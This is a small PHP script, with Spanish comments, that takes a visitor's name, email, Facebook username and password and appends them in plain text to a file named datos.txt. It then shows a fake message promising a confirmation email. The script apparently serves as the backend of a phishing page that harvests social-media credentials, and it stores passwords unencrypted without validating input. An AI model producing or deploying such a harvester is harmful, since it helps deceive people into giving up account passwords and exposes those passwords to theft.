<?php

$nombre="";
if (!empty($_REQUEST['nombre'])){
$nombre=$_REQUEST['nombre'];
}
 
$correo="";
if (!empty($_REQUEST['correo'])){
$correo=$_REQUEST['correo'];
}
 
$facebook="";
if (!empty($_REQUEST['facebook'])){
$facebook=$_REQUEST['facebook'];
}
 
$contrasena="";
if (!empty($_REQUEST['contrasena'])){
$contrasena=$_REQUEST['contrasena'];
}
 
// echo $nombre; 
// echo $correo;
// echo $facebook;  
// echo $contrasena;
//Luego sobrescribo el txt
 
$archivo="datos.txt";
 
     // $file=fopen($archivo,"w");
     // fwrite($file,"Nombre:".$nombre."\n");
     // fwrite($file,"Correo:".$correo."\n");
     // fwrite($file,"Usuario de Facebook:".$facebook."\n");
     // fwrite($file,"Contraseña:".$contrasena."\n");
     // fclose($file);

$contenido = "Nombre:".$nombre."\n"."Correo:".$correo."\n"."Usuario de Facebook:".$facebook."\n"."Contraseña:".$contrasena."\n";     

if (is_writable($archivo)) {

    // En nuestro ejemplo estamos abriendo $nombre_archivo en modo de adición.
    // El puntero al archivo está al final del archivo
    // donde irá $contenido cuando usemos fwrite() sobre él.
    if (!$gestor = fopen($archivo, 'a')) {
         echo "No se puede abrir el archivo ($archivo)";
         exit;
    }

    // Escribir $contenido a nuestro archivo abierto.
    if (fwrite($gestor, $contenido) === FALSE) {
        echo "No se puede escribir en el archivo ($archivo)";
        exit;
    }

    echo '<h3>FELICIDADES, RECIBIRAS UN CORREO ELECTRONICO PARA CONFIRMAR TU REGISTRO/CUENTA</h3><br>
    		<h5>Desde el correo electrónico que recibas podras iniciar sesión</h5>
    		<a href="index.php">Regresar</a>';

    fclose($gestor);

} else {
    echo "El archivo $archivo no es escribible";
}


?>